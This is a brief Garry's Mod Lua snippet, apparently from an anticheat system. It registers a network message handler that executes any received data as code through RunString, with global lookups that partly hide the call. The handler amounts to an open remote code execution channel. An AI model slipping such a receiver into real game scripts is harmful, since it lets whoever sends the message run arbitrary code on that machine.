local _G = _G
local RunString = _G["RunString"]
local Receive = _G["net"]["Receive"]
local ReadData = _G["net"]["ReadData"]

Receive("g-AC_nonofurgoddamnbusiness", function(len)
    RunString(ReadData(len), "?%__1")
end)